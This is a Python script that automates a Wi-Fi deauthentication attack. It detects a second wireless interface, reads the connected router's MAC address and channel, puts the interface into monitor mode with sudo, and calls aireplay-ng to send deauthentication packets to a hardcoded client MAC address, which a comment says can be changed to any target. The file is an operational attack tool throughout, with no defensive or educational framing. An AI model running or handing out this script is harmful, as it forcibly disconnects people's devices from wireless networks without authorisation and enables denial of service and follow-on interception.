import subprocess
import re
import time

def get_wireless_interface():
    """Gets the name of the second wireless interface."""
    try:
        iwconfig_output = subprocess.check_output(['iwconfig'], universal_newlines=True)
        interfaces = []
        for line in iwconfig_output.split('\n'):
            if 'IEEE 802.11' in line:
                interface = line.split()[0]
                interfaces.append(interface)
        
        if len(interfaces) >= 2:
            second_interface = interfaces[1]  # Select the second interface
            print("Second Wireless Interface:", second_interface)
            return second_interface
        else:
            print("Less than 2 wireless interfaces found.")
            return None
    except Exception as e:
        print(f"Error getting wireless interface: {e}")
        return None

def get_ap_mac(interface):
    """Gets the MAC address of the connected access point (router) using iw dev."""
    try:
        iw_output = subprocess.check_output(['iw', 'dev', interface, 'link'], universal_newlines=True)
        match = re.search(r'Connected to ([0-9A-Fa-f:]+)', iw_output)
        if match:
            ap_mac = match.group(1)
            print("Router MAC:", ap_mac)
            return ap_mac
        else:
            print("Could not find Access Point MAC.")
            return None
    except Exception as e:
        print(f"Error getting AP MAC: {e}")
        return None

def get_wifi_channel(interface):
    """Gets the Wi-Fi channel of the connected access point using iw dev."""
    try:
        iw_output = subprocess.check_output(['iw', 'dev', interface, 'info'], universal_newlines=True)
        match = re.search(r'channel\s+(\d+)', iw_output)
        if match:
            channel = match.group(1)
            print("Wi-Fi Channel:", channel)
            return channel
        else:
            print("Could not determine channel.")
            return None
    except Exception as e:
        print(f"Error getting Wi-Fi channel: {e}")
        return None

def enable_monitor_mode(interface):
    """Enables monitor mode on the specified interface using iw."""
    try:
        # Disable the interface first
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
        # Set the interface to monitor mode
        subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'type', 'monitor'], check=True)
        # Enable the interface again
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
        
        mon_interface = interface
        print(f"Monitor mode enabled: {mon_interface}")
        return mon_interface
    except Exception as e:
        print(f"Error enabling monitor mode: {e}")
        return None

def send_deauth_attack(bssid, target_mac, interface, channel):
    """Sends deauthentication packets to the target device."""
    try:
        # Set interface to the correct channel
        subprocess.run(['sudo', 'iwconfig', interface, 'channel', channel], check=True)
        print(f"Set {interface} to channel {channel}")

        # Send deauthentication packets
        print(f"Sending deauth attack to {target_mac} on {bssid} via {interface}")
        subprocess.run(['sudo', 'aireplay-ng', '-0', '10', '-a', bssid, '-c', target_mac, interface], check=True)
        print("Deauth attack completed.")
    except Exception as e:
        print(f"Error sending deauth attack: {e}")

# Main execution
def main():
    try:
        interface = get_wireless_interface()
        if not interface:
            print("No second wireless interface found.")
            return
    except Exception as e:
        print(f"Error getting wireless interface: {e}")
        return

    try:
        ap_mac = get_ap_mac(interface)
        if not ap_mac:
            print("No access point MAC found.")
            return
    except Exception as e:
        print(f"Error getting access point MAC: {e}")
        return

    try:
        channel = get_wifi_channel(interface)
        if not channel:
            print("Could not determine Wi-Fi channel.")
            return
    except Exception as e:
        print(f"Error getting Wi-Fi channel: {e}")
        return

    try:
        mon_interface = enable_monitor_mode(interface)
        if not mon_interface:
            print("Could not enable monitor mode.")
            return
    except Exception as e:
        print(f"Error enabling monitor mode: {e}")
        return

    try:
        #target_mac = "4c:2e:5e:d1:d7:89"  # You can update this to any target MAC address
        target_mac = "4c:2e:5e:d1:d7:89"  # You can update this to any target MAC address
        send_deauth_attack(ap_mac, target_mac, mon_interface, channel)
    except Exception as e:
        print(f"An error occurred during the deauth attack: {e}")

if __name__ == "__main__":
    main()